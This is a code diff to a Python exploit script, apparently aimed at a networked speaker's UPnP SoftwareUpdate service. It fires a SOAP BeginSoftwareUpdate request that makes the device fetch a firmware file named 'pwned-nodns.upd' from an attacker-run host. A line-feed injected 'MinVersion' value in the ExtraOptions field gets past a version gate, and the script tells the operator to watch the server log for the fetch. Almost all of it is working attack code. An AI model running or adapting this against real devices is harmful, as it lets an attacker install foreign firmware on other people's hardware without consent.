@@ -13,39 +13,28 @@ type-3 (the documented open question), the preinstall plants
 """
 import subprocess, sys, re, time
 
-def soap(ip, action, extra, svc="urn:schemas-upnp-org:service:SoftwareUpdate:1"):
-    ctl = f"http://{ip}:1400/MediaRenderer/SoftwareUpdate/Control" if False else None
-    # SoftwareUpdate service may live under a different control path; discover:
-    r = subprocess.run(["curl","-s","-m","8",f"http://{ip}:1400/MediaRenderer/SoftwareUpdate/Control"],
+def soap(ip, action, extra, svc="urn:schemas-upnp-org:service:ZoneGroupTopology:1"):
+    ctl = f"http://{ip}:1400/ZoneGroupTopology/Control"
+    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
+            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
+            f'<u:{action} xmlns:u="{svc}"><InstanceID>0</InstanceID>{extra}</u:{action}>'
+            '</s:Body></s:Envelope>')
+    r = subprocess.run(["curl","-s","-m","30","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',
+                        "-H",f'SOAPACTION: "{svc}#{action}"',"--data-binary",body,ctl],
                        capture_output=True, text=True)
-    return r
+    return r.stdout
 
 def main():
     ip = sys.argv[1]
     url = sys.argv[2] if len(sys.argv) > 2 else "http://192.168.4.160:8899/pwned-nodns.upd"
-    # discover the SWUpdate control URL from the device description
-    r = subprocess.run(["curl","-s","-m","8",f"http://{ip}:1400/xml/device_description.xml"],capture_output=True,text=True)
-    ctl = None
-    for m in re.finditer(r"<controlURL>([^<]+)</controlURL>.*?SoftwareUpdate", r.stdout if False else r.stdout, re.S):
-        pass
-    # simpler: scan all controlURLs and try each with the SWUpdate action
-    ctrls = re.findall(r"<controlURL>([^<]+)</controlURL>", r.stdout)
-    svc_type = "urn:schemas-upnp-org:service:SoftwareUpdate:1"
-    body_t = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
-              's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
-              '<u:BeginSoftwareUpdate xmlns:u="%s"><InstanceID>0</InstanceID>'
-              '<UpdateURL>%s</UpdateURL><Flags>1</Flags><ExtraOptions></ExtraOptions>'
-              '</u:BeginSoftwareUpdate></s:Body></s:Envelope>')
-    for c in ctrls:
-        ctl = f"http://{ip}:1400{c}" if c.startswith("/") else f"http://{ip}:1400{c}"
-        r = subprocess.run(["curl","-s","-m","20","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',
-                            "-H",f'SOAPACTION: "{svc_type}#BeginSoftwareUpdate"',
-                            "--data-binary", body_t % (svc_type, url), ctl], capture_output=True, text=True)
-        if "UPnPError" not in r.stdout:
-            print(f"BSU fired via {ctl}")
-            print(r.stdout[:300])
-            return
-    print("no SoftwareUpdate control found; ctrls tried:", ctrls)
+    extra = "&#10;MinVersion: [57.16-41110]"   # LF-injected MinVersion line (2nd-gate satisfier)
+    out = soap(ip, "BeginSoftwareUpdate",
+               f"<UpdateURL>{url}</UpdateURL><Flags>1</Flags><ExtraOptions>{extra}</ExtraOptions>")
+    if "UPnPError" in out:
+        print("ERR:", out[:300])
+    else:
+        print("BSU fired:", out[:200])
+        print("now watch: /tmp/q57-serve/http8899.log for the fetch + the unit's /status/upgradeinfo")
 
 if __name__ == "__main__":
     main()
